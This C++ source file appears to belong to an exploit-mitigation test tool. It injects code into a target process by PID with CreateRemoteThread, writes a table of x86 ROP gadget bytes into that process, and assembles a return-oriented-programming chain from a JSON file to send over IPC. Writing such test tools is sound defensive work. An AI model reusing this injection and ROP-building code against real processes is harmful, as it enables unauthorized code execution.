#include "../helpers.h"
#include "../../common/rapidjson/document.h"
#include "../../common/rapidjson/schema.h"
#include "../../common/rapidjson/stringbuffer.h"
#include "exec_ropchain.h"

#define JSON_PAYLOAD_SCHEMA "{\n\
\"type\": \"object\",\n\
\"properties\" : {\n\
    \"payload\": {\n\
        \"type\": \"array\",\n\
        \"items\" : {\n\
            \"type\": \"object\",\n\
                \"patternProperties\" : {\n\
                    \"^[G|D]$\": { \"type\": \"string\" }\n\
                },\n\
                \"additionalProperties\": false\n\
            }\n\
        }\n\
    },\n\
\"required\": [\"payload\"],\n\
\"additionalProperties\": false\n\
}"

bool ExecutorROPChain::Execute(TestCommon::TestData &data)
{
	bool ret = true;

	std::wcout << L"[+] About to execute " << GetDescription() << std::endl;

	if (TestToolHelpers::IsTestDataValid(data))
	{
		// Building the gadgetDbEncoded array to send it to the injected process
		LPVOID gadgetDbRemoteAddr = nullptr;
		DWORD gadgetDbSize = MAX_PAYLOAD_SIZE;
		char gadgetDbEncoded[MAX_PAYLOAD_SIZE] = { 0 };

		// This map will contain the offset of each gadget from the start of the gadget_db array
		std::map <std::string, unsigned int> gadgetDbIndexed;
		unsigned int gadgetOffset = 0;

		for (auto it = gadgetDbStrings.begin(); it != gadgetDbStrings.end(); it++)
		{
			gadgetDbIndexed.insert(std::pair <std::string, unsigned int>(it->first, gadgetOffset));
			
			for (unsigned int i = 0; i < it->second.length(); i++)
			{
				gadgetDbEncoded[gadgetOffset] = *(it->second.c_str() + i);
				gadgetOffset++;
			}
		}

		if (TestToolHelpers::InjectIntoProcessViaCreateRemoteThread(data.fileToInject, data.pidToInject, gadgetDbEncoded, gadgetDbSize, gadgetDbRemoteAddr))
		{
			DWORD fakeSize = MAX_PAYLOAD_SIZE;
			DWORD fakePayload[MAX_PAYLOAD_SIZE] = { 0 };
			DWORD bytesRead = 0;

			char fakePayloadJsonText[MAX_PAYLOAD_SIZE] = { 0 };
			
			if (TestToolHelpers::ReadFileToInjectInBuffer(data.testcaseFile, fakeSize, fakePayloadJsonText, bytesRead))
			{
				// Building the schema for JSON payload structure validation
				rapidjson::Document fakePayloadJsonSchema;
				bool errorParsingJsonSchema = fakePayloadJsonSchema.Parse(JSON_PAYLOAD_SCHEMA).HasParseError();
				
				rapidjson::SchemaDocument schema(fakePayloadJsonSchema);
				rapidjson::SchemaValidator validator(schema);
				
				// Parsing fake payload JSON document
				rapidjson::Document fakePayloadJsonDocument;
				bool errorParsingJsonDocument = fakePayloadJsonDocument.Parse(fakePayloadJsonText).HasParseError();

				if (!errorParsingJsonSchema && !errorParsingJsonDocument && fakePayloadJsonDocument.Accept(validator))
				{
					const rapidjson::Value& payloadArray = fakePayloadJsonDocument["payload"];

					// Adding POP POP RET as the first gadget to make the stack ready for the chain execution
					unsigned int currentGadgetOffset = gadgetDbIndexed.find("POP EAX ; POP EAX ; RET")->second;
					char * address = (char *)gadgetDbRemoteAddr + currentGadgetOffset;
					fakePayload[0] = (DWORD)address;

					// Filling the payload buffer
					for (rapidjson::SizeType i = 0; i < payloadArray.Size(); i++)
					{
						currentGadgetOffset = 0;
						address = NULL;
						
						if (payloadArray[i].FindMember("G") != payloadArray[i].MemberEnd())
						{
							std::wcerr << "    Adding GADGET to payload --> " << payloadArray[i].FindMember("G")->value.GetString() << std::endl;
							
							std::string currentGadget = payloadArray[i].FindMember("G")->value.GetString();
							unsigned int currentGadgetOffset = gadgetDbIndexed.find(currentGadget)->second;
							char * address = (char *)gadgetDbRemoteAddr + currentGadgetOffset;
							fakePayload[i+1] = (DWORD)address;
						}
						else
						{
							std::wcerr << "    Adding DATA to payload --> " << payloadArray[i].FindMember("D")->value.GetString() << std::endl;
							
							char * data = (char *)std::stoi(payloadArray[i].FindMember("D")->value.GetString(), nullptr, 16);
							fakePayload[i+1] = (DWORD)data;
						}
					}

					std::wcerr << L"    Prass ENTER to send and execute the shellcode." << std::endl;
					std::getchar();

					//Opening IPC and sending shellcode here
					auto IPCClient = new TestToolHelpers::IPCClient(data.channelID);
					TestCommon::ARRAYBYTE ret = IPCClient->SendRequest(TestCommon::TestExecutorsMode::TEST_ROP_CHAIN, (unsigned char *)fakePayload, fakeSize);
				}
				else
				{
					std::wcerr << L"[-] The fake payload JSON file is not valid. Quitting now." << std::endl;

					rapidjson::StringBuffer errorInfo;
					validator.GetInvalidSchemaPointer().StringifyUriFragment(errorInfo);
					std::wcerr << L"    Invalid schema: " << errorInfo.GetString() << std::endl;
					std::wcerr << L"    Invalid keyword: " << validator.GetInvalidSchemaKeyword() << std::endl;
					errorInfo.Clear();
					validator.GetInvalidDocumentPointer().StringifyUriFragment(errorInfo);
					std::wcerr << L"    Invalid document: " << errorInfo.GetString() << std::endl;

					ret = false;
				}
			}
			else
			{
				std::wcerr << L"[-] There was a problem readding the fake payload JSON file. Quitting now." << std::endl;

				ret = false;
			}
		}
		else
		{
			std::wcerr << L"[-] There was a problem injecting test framework into target process. Quitting now." << std::endl;

			ret = false;
		}
	}

	return ret;
}

void ExecutorROPChain::initGadgetDB()
{
	gadgetDbStrings.insert(std::pair <std::string, std::string>("POP EAX ; POP EAX ; RET", "\x58\x58\xc3"));
	// PUSH REGISTER
	gadgetDbStrings.insert(std::pair <std::string, std::string>("PUSH EAX ; RET", "\x50\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("PUSH EBX ; RET", "\x53\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("PUSH ECX ; RET", "\x51\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("PUSH EDX ; RET", "\x52\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("PUSH EBP ; RET", "\x55\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("PUSH ESP ; RET", "\x54\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("PUSH ESI ; RET", "\x56\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("PUSH EDI ; RET", "\x57\xc3"));
	// POP REGISTER
	gadgetDbStrings.insert(std::pair <std::string, std::string>("POP EAX ; RET", "\x58\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("POP EBX ; RET", "\x5b\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("POP ECX ; RET", "\x59\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("POP EDX ; RET", "\x5a\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("POP EBP ; RET", "\x5d\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("POP ESP ; RET", "\x5c\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("POP ESI ; RET", "\x5e\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("POP EDI ; RET", "\x5f\xc3"));
	// MOV EAX, REGISTER
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EAX, EBX ; RET", "\x89\xd8\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EAX, ECX ; RET", "\x89\xc8\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EAX, EDX ; RET", "\x89\xd0\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EAX, EBP ; RET", "\x89\xe8\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EAX, ESP ; RET", "\x89\xe0\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EAX, ESI ; RET", "\x89\xf0\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EAX, EDI ; RET", "\x89\xf8\xc3"));
	// MOV EBX, REGISTER
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EBX, EAX ; RET", "\x89\xc3\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EBX, ECX ; RET", "\x89\xcb\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EBX, EDX ; RET", "\x89\xd3\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EBX, EBP ; RET", "\x89\xeb\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EBX, ESP ; RET", "\x89\xe3\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EBX, ESI ; RET", "\x89\xf3\xc3"));
	gadgetDbStrings.insert(std::pair <std::string, std::string>("MOV EBX, EDI ; RET", "\x89\xfb\xc3"));
}